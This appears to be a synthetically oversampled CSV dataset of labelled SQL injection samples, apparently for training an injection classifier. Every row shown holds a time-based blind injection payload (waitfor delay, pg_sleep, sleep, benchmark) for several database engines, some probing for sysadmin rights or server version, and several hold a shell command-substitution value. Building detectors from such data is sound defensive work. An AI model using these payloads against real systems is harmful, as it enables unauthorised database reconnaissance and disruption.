id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000206,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.9852797808557635
SMOTE_000207,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4543287585526263
SMOTE_000208,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.20225289626734974
SMOTE_000209,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.8940154829002398
SMOTE_000210,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.007088217119119711
SMOTE_000211,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.961533925638102
SMOTE_000212,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.7633525477765986
SMOTE_000213,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.4988858243551744
SMOTE_000214,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.10588526969630167
SMOTE_000215,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9624890722482292
SMOTE_000216,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.08338033017122122
SMOTE_000217,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.7188378786398515
SMOTE_000218,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.4732208945488129
SMOTE_000219,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.1943140622047709
SMOTE_000220,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.350667930046992
SMOTE_000221,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.0326785308077835
SMOTE_000222,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.6092810521843783
SMOTE_000223,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.1028044550857028
SMOTE_000224,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.029127835989210153
SMOTE_000225,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0872519849727447
SMOTE_000226,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.5777080413841563
SMOTE_000227,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.5346094682895088
SMOTE_000228,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.1268259721100733
SMOTE_000229,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.2820654010907093
SMOTE_000230,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.20550298962624677
SMOTE_000231,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.11120981735594966
SMOTE_000232,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.19325614401427044
SMOTE_000233,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.3369005073582402
SMOTE_000234,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.748008251987413
SMOTE_000235,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.3842199947023164
SMOTE_000236,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.568468157578298
SMOTE_000237,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7462912853950968
SMOTE_000238,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.0665066810666866
SMOTE_000239,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.6147809331442908
SMOTE_000240,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.3966817296683107
SMOTE_000241,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9022107343934723
SMOTE_000242,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.4173874697688848
SMOTE_000243,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.07085000336405985
SMOTE_000244,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.00019124072019964714
SMOTE_000245,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.08596706550493995
SMOTE_000246,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.13932480440918832
SMOTE_000247,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.20551623833678487
SMOTE_000248,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.364530902648983
SMOTE_000249,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.4982697944067422
SMOTE_000250,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.6022279465266829
SMOTE_000251,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.7862115016213814
SMOTE_000252,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.511364438427564
SMOTE_000253,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.33833337574452194
SMOTE_000254,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.6439899894282449
SMOTE_000255,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.17295027706376664
SMOTE_000256,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.5482425294016553
SMOTE_000257,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.0760989776909335
SMOTE_000258,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.221057452835361
SMOTE_000259,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.5187172628158595
SMOTE_000260,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.01886186755272918
SMOTE_000261,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.07075402906829467
SMOTE_000262,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.01312531739344755
SMOTE_000263,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.6519927737466487
SMOTE_000264,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.9123941426913746
SMOTE_000265,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.543064597612153
SMOTE_000266,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.06595749707115028
SMOTE_000267,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.05631845235655569
SMOTE_000268,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.30694094812817
SMOTE_000269,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.21517642428104228
SMOTE_000270,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.278599046304344
SMOTE_000271,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.1507069410023685
SMOTE_000272,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.8553111705849398
SMOTE_000273,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.214263816744644
SMOTE_000274,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.4881009060310482
SMOTE_000275,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3453402370683341
SMOTE_000276,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.15585131930627838
SMOTE_000277,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.7623341616178942
SMOTE_000278,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.10255920503802424
SMOTE_000279,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.469151472125658
SMOTE_000280,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.044363379891077734
SMOTE_000281,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6168780806835812
SMOTE_000282,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.4275984464017901
SMOTE_000283,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.3536163168648512
SMOTE_000284,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.2840181292012194
SMOTE_000285,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9133779337904243
SMOTE_000286,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.7425473933865747
SMOTE_000287,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,3.247000227226426
SMOTE_000288,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.2697564312864233
SMOTE_000289,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.6846757799862022
SMOTE_000290,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.6265853347011711
SMOTE_000291,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.2167108850281307
SMOTE_000292,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7055424034679901
SMOTE_000293,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3418300359181793
SMOTE_000294,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9484714061534686
SMOTE_000295,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.3341972184727245
SMOTE_000296,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6665187233452083
SMOTE_000297,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3744536451878515
SMOTE_000298,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.6000856176648588
SMOTE_000299,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2354935344254887
SMOTE_000300,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,3.0799465836536517
SMOTE_000301,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.43241851837911605
SMOTE_000302,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.01711059544153046
SMOTE_000303,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.4814687493945879
SMOTE_000304,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.1737386098644
SMOTE_000305,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.1196071638841847
SMOTE_000306,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,2.3659356155224627
SMOTE_000307,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.28839870422392816
SMOTE_000308,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.543435650428798
SMOTE_000309,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8447117056686111
SMOTE_000310,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.014252743712283
SMOTE_000311,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.18768143840808743
SMOTE_000312,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.7075367218568195
SMOTE_000313,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.1898077833193146
SMOTE_000314,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.9654802491874999
SMOTE_000315,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.0455274881489403
SMOTE_000316,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.3778796987749829
SMOTE_000317,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.9357942539937981
SMOTE_000318,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.02549359934523627
SMOTE_000319,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.8411331531064509
SMOTE_000320,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.575233604966382
SMOTE_000321,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.6636018551719296
SMOTE_000322,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_000323,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.10092860817156618
SMOTE_000324,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.176719630466306
SMOTE_000325,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.25433496381623294
SMOTE_000326,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.8885805373531057
SMOTE_000327,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.6243726380007566
SMOTE_000328,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.4057684005482876
SMOTE_000329,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.25972523123706853
SMOTE_000330,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.6833855909042708
SMOTE_000331,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.04046292624331683
SMOTE_000332,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.001392591802655201
SMOTE_000333,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.4623850792525217
SMOTE_000334,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.7427359252672836
SMOTE_000335,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.3922086689151016
SMOTE_000336,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.7994373809521624
SMOTE_000337,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.2669959691860106
SMOTE_000338,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.005767603846635118
SMOTE_000339,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.044412212669804
SMOTE_000340,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.5459739205784595
SMOTE_000341,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0030066130057234
SMOTE_000342,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.5144171335977876
SMOTE_000343,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.5234530375512128
